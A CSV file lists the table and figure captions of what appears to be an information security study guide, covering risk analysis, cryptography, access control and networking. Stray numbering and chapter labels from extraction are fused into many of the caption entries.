Code,Text
TABLE 2.1,Comparison of quantitative and qualitative risk analysis 2 .
TABLE 2.2,Quantitative risk analysis formulas 2 . Chapter 5 1 .
TABLE 5.1,Securing email data 2 .
TABLE 5.2,Unmodified data within a database 3 .
TABLE 5.3,Masked data 3 . Chapter 6 1 .
TABLE 6.1,AND operation truth table 2 .
TABLE 6.2,OR operation truth table 3 .
TABLE 6.3,NOT operation truth table 4 .
TABLE 6.4,Exclusive OR operation truth table 5 .
TABLE 6.5,Using the Vigenère system 6 .
TABLE 6.6,The encryption operation 7 .
TABLE 6.7,Symmetric and asymmetric key comparison 8 .
TABLE 6.8,Comparison of symmetric and asymmetric cryptography systems 9 .
TABLE 6.9,Symmetric encryption memorization chart 4 . Chapter 7 1 .
TABLE 7.1,Hash algorithm memorization chart 2 .
TABLE 7.2,Digital certificate formats 5 . Chapter 8 1 .
TABLE 8.1,Subjects and objects 2 .
TABLE 8.2,Fail terms' definitions related to physical and digital products 3 .
TABLE 8.3,An access control matrix 4 .
TABLE 8.4,Common Criteria evaluation assurance levels 6 . Chapter 10 1 .
TABLE 10.1,Static voltage and damage 2 .
TABLE 10.2,Fire extinguisher classes 7 . Chapter 11 1 .
TABLE 11.1,IP classes 2 .
TABLE 11.2,IP classes' default subnet masks 3 .
TABLE 11.3,802.11 wireless networking amendments 4 .
TABLE 11.4,UTP categories 8 . Chapter 12 1 .
TABLE 12.1,Common load-balancing scheduling techniques 2 .
TABLE 12.2,Circuit switching vs. packet switching 3 .
TABLE 12.3,Bandwidth levels of SDH and SONET List of Illustrations 1 . Chapter 1 1 .
FIGURE 1.1,The CIA Triad 2 .
FIGURE 1.2,The five elements of AAA services 3 .
FIGURE 1.3,"Strategic, tactical, and operational plan timeline comparison 4 ."
FIGURE 1.4,An example of diagramming to reveal threat concerns 5 .
FIGURE 1.5,A risk matrix or risk heat map 2 . Chapter 2 1 .
FIGURE 2.1,Former employees must return all company property. 2 .
FIGURE 2.2,The cyclical relationships of risk elements 3 .
FIGURE 2.3,The six major elements of quantitative risk analysis 4 .
FIGURE 2.4,The categories of security controls in a defense-in-depth impleme... 5 .
FIGURE 2.5,The elements of the risk management framework (RMF) (from NIST SP... 3 . Chapter 3 1 .
FIGURE 3.1,Earthquake hazard map of the United States 4 . Chapter 5 1 .
FIGURE 5.1,Data classifications 2 .
FIGURE 5.2,Clearing a hard drive 5 . Chapter 6 1 .
FIGURE 6.1,Challenge-response authentication protocol 2 .
FIGURE 6.2,The magic door 3 .
FIGURE 6.3,Symmetric key cryptography 4 .
FIGURE 6.4,Asymmetric key cryptography 6 . Chapter 7 1 .
FIGURE 7.1,Asymmetric key cryptography 2 .
FIGURE 7.2,Steganography tool 7/442 3 .
FIGURE 7.3,Image with embedded message 7 . Chapter 8 1 .
FIGURE 8.1,Transitive trust 2 .
